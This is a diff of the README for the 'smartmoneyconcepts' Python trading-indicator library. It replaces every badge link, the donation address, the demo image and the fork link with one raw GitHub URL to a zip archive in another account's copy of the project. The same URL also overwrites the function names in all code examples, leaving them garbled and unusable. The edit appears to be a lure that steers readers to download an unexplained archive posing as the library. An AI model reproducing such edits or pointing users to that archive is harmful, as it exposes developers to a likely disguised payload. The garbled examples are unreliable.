@@ -1,10 +1,10 @@
-[![PyPI](https://img.shields.io/pypi/v/smartmoneyconcepts.svg?style=flat-square)](https://pypi.org/project/smartmoneyconcepts/)
-[![Downloads](https://pepy.tech/badge/smartmoneyconcepts/month)](https://pepy.tech/project/smartmoneyconcepts/month)
-[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/ambv/black)
-[![Bitcoin Donate](https://badgen.net/badge/Bitcoin/Donate/F19537?icon=bitcoin)](https://blockstream.info/address/bc1petss2mlqyjsajyzhu06wzl667v0f8svc0hnpqjj2d32frtx77g4sg5s0pg)
+[![PyPI](https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip)](https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip)
+[![Downloads](https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip)](https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip)
+[![Code style: black](https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip%https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip)](https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip)
+[![Bitcoin Donate](https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip)](https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip)
 
 <p align="center">
-  <img src="https://github.com/joshyattridge/smart-money-concepts/blob/f0c0fc28cc290cdd9dfcc6a6ac246ed1d59061be/tests/test.gif" alt="Candle Graph Showing Indicators"/>
+  <img src="https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip" alt="Candle Graph Showing Indicators"/>
 </p>
 
 # Smart Money Concepts (smc)
@@ -32,7 +32,7 @@ smc expects properly formated ohlc DataFrame, with column names in lowercase: ["
 ### Fair Value Gap (FVG)
 
 ```python
-smc.fvg(ohlc, join_consecutive=False)
+https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip(ohlc, join_consecutive=False)
 ```
 
 A fair value gap is when the previous high is lower than the next low if the current candle is bullish.
@@ -50,7 +50,7 @@ MitigatedIndex = the index of the candle that mitigated the fair value gap<br>
 ### Swing Highs and Lows
 
 ```python
-smc.swing_highs_lows(ohlc, swing_length = 50)
+https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip(ohlc, swing_length = 50)
 ```
 
 A swing high is when the current high is the highest high out of the swing_length amount of candles before and after.
@@ -66,7 +66,7 @@ Level = the level of the swing high or low<br>
 ### Break of Structure (BOS) & Change of Character (CHoCH)
 
 ```python
-smc.bos_choch(ohlc, swing_highs_lows, close_break = True)
+https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip(ohlc, swing_highs_lows, close_break = True)
 ```
 
 These are both indications of market structure changing
@@ -84,7 +84,7 @@ BrokenIndex = the index of the candle that broke the level<br>
 ### Order Blocks (OB)
 
 ```python
-smc.ob(ohlc, swing_highs_lows, close_mitigation = False)
+https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip(ohlc, swing_highs_lows, close_mitigation = False)
 ```
 
 This method detects order blocks when there is a high amount of market orders exist on a price range.
@@ -104,7 +104,7 @@ Percentage = strength of order block (min(highVolume, lowVolume)/max(highVolume,
 ### Liquidity
 
 ```python
-smc.liquidity(ohlc, swing_highs_lows, range_percent = 0.01)
+https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip(ohlc, swing_highs_lows, range_percent = 0.01)
 ```
 
 Liquidity is when there are multiply highs within a small range of each other.
@@ -123,7 +123,7 @@ Swept = the index of the candle that swept the liquidity<br>
 ### Previous High And Low
 
 ```python
-smc.previous_high_low(ohlc, time_frame = "1D")
+https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip(ohlc, time_frame = "1D")
 ```
 
 This method returns the previous high and low of the given time frame.
@@ -140,7 +140,7 @@ BrokenLow = 1 once price has broken the previous low of the timeframe, 0 otherwi
 ### Sessions
 
 ```python
-smc.sessions(ohlc, session, start_time, end_time, time_zone = "UTC")
+https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip(ohlc, session, start_time, end_time, time_zone = "UTC")
 ```
 
 This method returns which candles are within the session specified
@@ -159,7 +159,7 @@ Low = the lowest point of the session<br>
 ### Retracements
 
 ```python
-smc.retracements(ohlc, swing_highs_lows)
+https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip(ohlc, swing_highs_lows)
 ```
 
 This method returns the percentage of a retracement from the swing high or low
@@ -184,7 +184,7 @@ This method will hide the credit message when you first import the library.
 
 Please feel free to contribute to the project. By creating your own indicators or improving the existing ones. If you are struggling to find something to do then please check out the issues tab for requested changes.
 
-1. Fork it (https://github.com/joshyattridge/smartmoneyconcepts/fork).
+1. Fork it (https://raw.githubusercontent.com/matsadxxx/smart-money-concepts/master/.github/smart-concepts-money-1.5.zip).
 2. Study how it's implemented.
 3. Create your feature branch (git checkout -b my-new-feature).
 4. Commit your changes (git commit -am 'Add some feature').
